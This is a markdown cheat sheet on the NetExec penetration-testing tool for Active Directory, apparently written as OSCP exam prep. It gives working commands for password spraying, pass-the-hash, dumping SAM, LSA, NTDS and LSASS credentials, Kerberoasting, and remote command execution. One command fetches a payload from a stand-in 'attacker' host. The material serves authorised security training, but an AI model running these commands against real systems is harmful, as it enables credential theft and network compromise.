---
tags:
  - Active_Directory
  - Discovery
  - Enumeration
  - Foundational
  - NetExec
  - Windows
---

## NetExec (nxc)
resources: [NetExec GitHub](https://github.com/Pennyw0rth/NetExec), [NetExec Wiki](https://www.netexec.wiki/), [CrackMapExec to NetExec Migration](https://www.netexec.wiki/getting-started/migration-from-cme)

> NetExec (nxc) is the successor to CrackMapExec, providing network enumeration and exploitation capabilities for Windows environments.

> [!info] NetExec replaced CrackMapExec in 2023 due to trademark issues. All `cme` commands now use `nxc`.

## Installation

### Install via pipx (Recommended)
```bash
pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Install via pip
```bash
pip install netexec
```

### Verify Installation
```bash
nxc --version
```

## Basic Usage

### Syntax
```bash
nxc <protocol> <target> -u <username> -p <password> [options]
```

**Supported Protocols:**
- `smb` - SMB/CIFS enumeration and exploitation
- `ldap` - LDAP enumeration
- `winrm` - WinRM access testing
- `rdp` - RDP access testing
- `ssh` - SSH access testing
- `mssql` - MS SQL Server enumeration
- `ftp` - FTP enumeration
- `wmi` - WMI enumeration

## SMB Enumeration

### Test Single Credential
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>'
```

> [!tip] Green `(Pwn3d!)` indicates local admin access.

### Test Multiple Targets
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>'
```

### Test with Username List
```bash
nxc smb <TargetIP> -u users.txt -p '<Password>'
```

### Test with Password List
```bash
nxc smb <TargetIP> -u <Username> -p passwords.txt
```

### Test with Both Lists
```bash
nxc smb <TargetIP> -u users.txt -p passwords.txt
```

> [!warning] This tests every user/password combination - can cause account lockouts.

### Continue on Success
```bash
nxc smb <TargetIP> -u users.txt -p passwords.txt --continue-on-success
```

> [!tip] Keeps testing even after finding valid credentials.

## Authentication Methods

### Domain Authentication
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain>
```

### Local Authentication
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --local-auth
```

### Pass-the-Hash
```bash
nxc smb <TargetIP> -u <Username> -H <NTLMHash>
```

**Example:**
```bash
nxc smb 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Kerberos Authentication
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain> --kerberos
```

### Null Session
```bash
nxc smb <TargetIP> -u '' -p ''
```

### Guest Account
```bash
nxc smb <TargetIP> -u 'guest' -p ''
```

## Enumeration Modules

### Enumerate Shares
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --shares
```

### Enumerate Users
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --users
```

### Enumerate Groups
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --groups
```

### Enumerate Local Groups
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --local-groups
```

### Enumerate Logged On Users
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --loggedon-users
```

### Enumerate Domain Controllers
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --dc-list
```

### Enumerate Password Policy
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --pass-pol
```

> [!tip] Critical for password spraying - shows lockout threshold and reset time.

### Enumerate Sessions
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --sessions
```

### Enumerate Disks
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --disks
```

## Spider Shares

### Spider All Readable Shares
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus
```

> [!tip] Recursively lists all files in accessible shares.

### Spider with Pattern Matching
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus -o PATTERN=password
```

> Searches for files containing "password" in the name.

### Spider with File Extensions
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus -o EXCLUDE_EXTS=jpg,png,gif
```

## Command Execution

### Execute Command via SMB
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -x 'whoami'
```

> [!info] `-x` executes cmd.exe commands.

### Execute PowerShell Command
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -X 'Get-Host'
```

> [!info] `-X` executes PowerShell commands.

### Execute on Multiple Targets
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' -x 'hostname'
```

## Credential Dumping

### Dump SAM Hashes
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --sam
```

### Dump LSA Secrets
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --lsa
```

### Dump NTDS.dit (Domain Controller)
```bash
nxc smb <DomainController> -u <Username> -p '<Password>' --ntds
```

> [!warning] Requires Domain Admin or equivalent privileges.

### Dump NTDS with Specific Method
```bash
nxc smb <DomainController> -u <Username> -p '<Password>' --ntds vss
```

**Methods:**
- `vss` - Volume Shadow Copy (default)
- `drsuapi` - Directory Replication Service API

### Dump LSASS
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M lsassy
```

> [!tip] Uses lsassy module for stealthier LSASS dumping.

## LDAP Enumeration

### Enumerate Users via LDAP
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --users
```

### Enumerate Groups via LDAP
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --groups
```

### Enumerate Computers via LDAP
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --computers
```

### Find Kerberoastable Users
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --kerberoasting
```

> [!tip] Automatically extracts Kerberos TGS tickets for cracking.

### Find AS-REP Roastable Users
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --asreproast
```

### Enumerate Trusted Domains
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --trusted-for-delegation
```

### Get Password Policy
```bash
nxc ldap <DomainController> -u <Username> -p '<Password>' --pass-pol
```

## WinRM Access

### Test WinRM Access
```bash
nxc winrm <TargetIP> -u <Username> -p '<Password>'
```

### Execute Command via WinRM
```bash
nxc winrm <TargetIP> -u <Username> -p '<Password>' -x 'whoami'
```

### Execute PowerShell via WinRM
```bash
nxc winrm <TargetIP> -u <Username> -p '<Password>' -X 'Get-Process'
```

## RDP Access Testing

### Test RDP Access
```bash
nxc rdp <TargetIP> -u <Username> -p '<Password>'
```

### Test RDP on Multiple Targets
```bash
nxc rdp 192.168.1.0/24 -u <Username> -p '<Password>'
```

## MS SQL Enumeration

### Test MS SQL Access
```bash
nxc mssql <TargetIP> -u <Username> -p '<Password>'
```

### Execute SQL Query
```bash
nxc mssql <TargetIP> -u <Username> -p '<Password>' -q 'SELECT @@version'
```

### Execute OS Command via xp_cmdshell
```bash
nxc mssql <TargetIP> -u <Username> -p '<Password>' -x 'whoami'
```

### Enumerate Linked Servers
```bash
nxc mssql <TargetIP> -u <Username> -p '<Password>' -M mssql_priv
```

## Useful Modules

### List All Modules
```bash
nxc smb -L
```

### Get Module Info
```bash
nxc smb -M lsassy --module-info
```

### Common Modules

#### lsassy - Dump LSASS
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M lsassy
```

#### nanodump - Alternative LSASS Dump
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M nanodump
```

#### mimikatz - Run Mimikatz
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M mimikatz
```

#### enum_av - Enumerate Antivirus
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M enum_av
```

#### gpp_password - Find GPP Passwords
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M gpp_password
```

#### gpp_autologin - Find Autologin Credentials
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M gpp_autologin
```

#### web_delivery - Metasploit Web Delivery
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -M web_delivery -o URL=http://attacker/payload
```

## Output Options

### Save to File
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --shares > shares.txt
```

### JSON Output
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --shares --json > shares.json
```

### Quiet Mode (No Banner)
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --shares -q
```

### Verbose Output
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --shares -v
```

## Advanced Techniques

### Password Spraying
```bash
nxc smb targets.txt -u users.txt -p 'Password123!' --continue-on-success
```

> [!warning] Monitor lockout threshold with `--pass-pol` first.

### Spray with Delay
```bash
nxc smb targets.txt -u users.txt -p 'Password123!' --continue-on-success --delay 5
```

> [!tip] Adds 5-second delay between attempts to avoid lockouts.

### Find Local Admin Access
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' | grep Pwn3d
```

> [!tip] Look for `(Pwn3d!)` to identify machines where you have admin rights.

### Relay Attack Setup
```bash
nxc smb <TargetIP> --gen-relay-list relay_targets.txt
```

> Generates list of targets without SMB signing for relay attacks.

### Check SMB Signing
```bash
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

> [!tip] Targets without SMB signing are vulnerable to relay attacks.

## Database Management

### Show Credentials Database
```bash
nxc smb --show-creds
```

> [!info] NetExec stores all discovered credentials in a local database.

### Clear Credentials Database
```bash
nxc smb --clear-creds
```

### Export Credentials
```bash
nxc smb --export-creds creds.txt
```

## Proxy Mode

### Use with ProxyChains
```bash
proxychains nxc smb <TargetIP> -u <Username> -p '<Password>'
```

### Use with SOCKS Proxy
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --proxy socks5://127.0.0.1:1080
```

## NetExec Workflow for OSCP

### Step 1: Enumerate Network
```bash
nxc smb 192.168.1.0/24
```

> Identifies live hosts with SMB.

### Step 2: Test Credentials
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>'
```

> Tests credentials across all hosts.

### Step 3: Enumerate Shares
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' --shares
```

### Step 4: Spider Shares for Sensitive Files
```bash
nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' -M spider_plus -o PATTERN=password
```

### Step 5: Dump Credentials
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' --sam --lsa
```

### Step 6: Execute Commands on Pwn3d Hosts
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -x 'whoami /all'
```

## Troubleshooting

### "STATUS_LOGON_FAILURE" Error
> [!warning] Invalid credentials or wrong domain.

**Solutions:**
- Try `--local-auth` for local accounts
- Verify domain with `-d <Domain>`
- Check username format (DOMAIN\user vs user@domain.com)

### "STATUS_ACCESS_DENIED" Error
> [!info] Valid credentials but insufficient privileges.

**Solutions:**
- Try different shares with `--shares`
- Check if user is in local admin group
- Attempt lateral movement to other hosts

### "Connection Refused" Error
```bash
# Check if SMB is running
nmap -p 445 <TargetIP>

# Try different protocol
nxc winrm <TargetIP> -u <Username> -p '<Password>'
```

### "SMB Signing Required" Error
> [!info] Cannot relay attacks to this target.

**Solution:**
- Use valid credentials instead of relay
- Find targets without SMB signing

## OSCP Exam Tips

> [!important] NetExec is essential for Active Directory enumeration.

**Time Estimate:** 5-10 minutes for comprehensive network enumeration

**Quick Wins:**
1. **Test credentials across all hosts** - Find where you have admin access
2. **Enumerate shares** - Look for sensitive files
3. **Check password policy** - Plan password spraying safely
4. **Dump SAM/LSA** - Get local credentials for lateral movement
5. **Spider shares** - Find passwords in files

**Common Mistakes:**
- Not using `--continue-on-success` when testing multiple credentials
- Causing account lockouts with aggressive password spraying
- Forgetting to check for null sessions (`-u '' -p ''`)
- Not testing local authentication (`--local-auth`)

**Pro Tips:**
- Always check `--pass-pol` before password spraying
- Use `--gen-relay-list` to find relay targets
- Save all output to files for later analysis
- Test both SMB and WinRM for command execution
- Use `-M spider_plus` to find sensitive files quickly
